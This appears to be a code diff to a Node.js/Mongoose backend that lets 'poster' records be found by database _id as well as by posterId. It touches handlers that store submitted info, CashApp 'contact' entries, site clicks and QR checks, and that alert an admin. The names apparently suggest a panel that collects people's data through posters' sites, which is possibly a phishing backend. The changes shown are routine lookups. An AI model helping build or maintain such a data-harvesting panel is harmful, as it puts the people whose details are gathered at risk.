@@ -132,7 +132,7 @@ export const login_post = async (req, res) => {
             id: poster._id,
             admin: poster.admin,
             adminId: admin.adminId,
-            posterId: poster.posterId,
+            posterId: poster.posterId || poster._id.toString(),
             qrCodeStatus: admin.qrCodeStatus,
           });
         }
@@ -415,7 +415,12 @@ export const add_data = async (req, res) => {
   try {
     const userFound = await User.findOne({ adminId: adminId });
 
-    const posterFound = await Poster.findOne({ posterId: posterId });
+    const posterFound = await Poster.findOne({
+      $or: [
+        { _id: posterId && posterId.length === 24 ? posterId : null },
+        { posterId: posterId }
+      ]
+    });
 
     if (userFound && posterFound) {
       const info = await Info.create({
@@ -444,7 +449,7 @@ export const add_data = async (req, res) => {
       if (info) {
         pusher.trigger(userFound.adminId, "new-notification", {
           adminId: userFound.adminId,
-          posterId: posterFound.posterId,
+          posterId: posterFound.posterId || posterFound._id.toString(),
           name: posterFound.username,
         });
       }
@@ -765,7 +770,7 @@ export const site_exist = async (req, res) => {
 
     if (sitefound) {
       const adminId = sitefound.root?.root?.adminId || "";
-      const posterId = sitefound.root?.posterId || "";
+      const posterId = sitefound.root?.posterId || sitefound.root?._id?.toString() || "";
 
       const clickfound = await Click.findOne({ site: siteName });
       if (clickfound) {
@@ -1305,7 +1310,12 @@ export const cashapap_post = async (req, res) => {
   try {
     const userFound = await User.findOne({ adminId: adminId });
 
-    const posterFound = await Poster.findOne({ posterId: posterId });
+    const posterFound = await Poster.findOne({
+      $or: [
+        { _id: posterId && posterId.length === 24 ? posterId : null },
+        { posterId: posterId }
+      ]
+    });
     if (userFound && posterFound) {
       const cashapp = await Cash.create({
         contact,
@@ -1420,7 +1430,12 @@ export const check_qrcode = async (req, res) => {
     }
 
     // 2. If not found, check if it's a Poster by posterId
-    const posterFound = await Poster.findOne({ posterId: adminId });
+    const posterFound = await Poster.findOne({
+      $or: [
+        { _id: adminId && adminId.length === 24 ? adminId : null },
+        { posterId: adminId }
+      ]
+    });
     if (posterFound) {
       const admin = await User.findOne({ _id: posterFound.root });
       if (admin) {
@@ -1511,7 +1526,12 @@ export const add_data_checnge = async (req, res) => {
   try {
     const userFound = await User.findOne({ adminId: adminId });
 
-    const posterFound = await Poster.findOne({ posterId: posterId });
+    const posterFound = await Poster.findOne({
+      $or: [
+        { _id: posterId && posterId.length === 24 ? posterId : null },
+        { posterId: posterId }
+      ]
+    });
 
     if (userFound && posterFound) {
       const info = await Info.create({
